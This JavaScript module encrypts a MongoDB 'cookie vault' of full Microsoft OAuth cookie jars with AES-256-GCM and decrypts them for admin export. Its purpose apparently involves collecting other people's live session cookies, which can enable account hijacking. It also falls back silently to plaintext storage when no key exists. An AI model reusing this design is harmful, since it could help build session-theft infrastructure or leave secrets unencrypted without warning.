/* Cookie-vault encryption at rest (AES-256-GCM).
 *
 * The vault stores full Microsoft-OAuth cookie jars — session-hijack
 * grade secrets. They are now encrypted before hitting Mongo, so a DB
 * dump alone yields no usable sessions. Key material: COOKIE_VAULT_KEY
 * if set, otherwise derived (scrypt) from EXT_API_KEY — which the gate
 * already requires in production, so a key always exists.
 *
 * Format: `v1:<iv b64>:<tag b64>:<ciphertext b64>`.
 * Legacy plaintext rows keep working: values without the `v1:` prefix
 * pass through unchanged (and get re-encrypted on the next save). */

import crypto from 'crypto';
import { getConfig } from '@/lib/config';

const PREFIX = 'v1:';
const SALT = 'ucp-cookie-vault-v1';

let cachedKey = null;
let cachedKeySource = '';

function vaultKey() {
  const config = getConfig();
  const material = (config.cookieVaultKey || config.extApiKey || '').trim();
  if (!material) return null;
  if (cachedKey && cachedKeySource === material) return cachedKey;
  cachedKey = crypto.scryptSync(material, SALT, 32);
  cachedKeySource = material;
  return cachedKey;
}

export function isEncryptedCookieValue(value) {
  return typeof value === 'string' && value.startsWith(PREFIX);
}

export function encryptCookieValue(value) {
  const key = vaultKey();
  if (key == null) return String(value ?? '');
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([
    cipher.update(String(value ?? ''), 'utf8'),
    cipher.final(),
  ]);
  const tag = cipher.getAuthTag();
  return (
    PREFIX +
    [iv.toString('base64'), tag.toString('base64'), ct.toString('base64')]
      .join(':')
  );
}

/* Decrypts `v1:` values; legacy plaintext passes through unchanged.
 * Never throws: an undecryptable value (wrong key) returns ''. */
export function decryptCookieValue(value) {
  if (!isEncryptedCookieValue(value)) return String(value ?? '');
  const key = vaultKey();
  if (key == null) return '';
  try {
    const [, ivB64, tagB64, ctB64] = value.split(':');
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      key,
      Buffer.from(ivB64, 'base64'),
    );
    decipher.setAuthTag(Buffer.from(tagB64, 'base64'));
    return Buffer.concat([
      decipher.update(Buffer.from(ctB64, 'base64')),
      decipher.final(),
    ]).toString('utf8');
  } catch (_) {
    return '';
  }
}

/* Encrypts a whole cookie list for storage. */
export function encryptCookieList(cookies) {
  return (cookies || []).map((c) => ({
    ...c,
    value: encryptCookieValue(c.value),
  }));
}

/* Decrypts a whole cookie list for admin export. */
export function decryptCookieList(cookies) {
  return (cookies || []).map((c) => ({
    ...c,
    value: decryptCookieValue(c.value),
  }));
}
